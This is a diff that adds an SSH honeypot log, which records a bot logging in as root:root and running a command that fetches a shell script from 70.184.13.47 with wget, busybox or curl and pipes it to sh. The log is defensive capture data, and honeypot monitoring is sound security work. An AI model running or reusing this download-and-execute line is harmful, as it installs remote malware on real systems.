@@ -1,0 +1,13 @@
+2025-12-05 00:00:57.136 - [Info] MITM Version: 1.4
+2025-12-05 00:00:57.150 - [Info] Auto Access Enabled: true
+2025-12-05 00:00:57.150 - [Debug] [Init] Auto Access Barrier: true
+2025-12-05 00:00:57.162 - [Info] SSH man-in-the-middle server for 172.20.0.5 listening on 0.0.0.0:10004
+2025-12-05 00:05:58.350 - [Debug] [Connection] Attacker connected: 193.32.127.228 | Client Identification: SSH-2.0-paramiko_3.5.1
+2025-12-05 00:05:59.831 - [Debug] [Auth] Attacker 193.32.127.228 trying to authenticate with "password"
+2025-12-05 00:05:59.841 - [Debug] [Auto Access] Attacker: 193.32.127.228, Threshold: 1, Attempts: 1
+2025-12-05 00:05:59.842 - [Debug] [Auto Access] Compromising the honeypot
+2025-12-05 00:05:59.842 - [Debug] [Auto Access] Adding the following credentials: "root:root"
+2025-12-05 00:06:01.108 - [Debug] [Auth] Valid credentials - Password Authentication
+2025-12-05 00:06:01.108 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.5
+2025-12-05 00:06:01.240 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2025-12-05 00:06:02.257 - [Debug] [EXEC] Noninteractive mode attacker command: (wget -qO- http://70.184.13.47/rondo.yah.sh||busybox wget -qO- http://70.184.13.47/rondo.yah.sh||curl -s http://70.184.13.47/rondo.yah.sh||good -qO- http://70.184.13.47/rondo.yah.sh)|sh;echo infected;
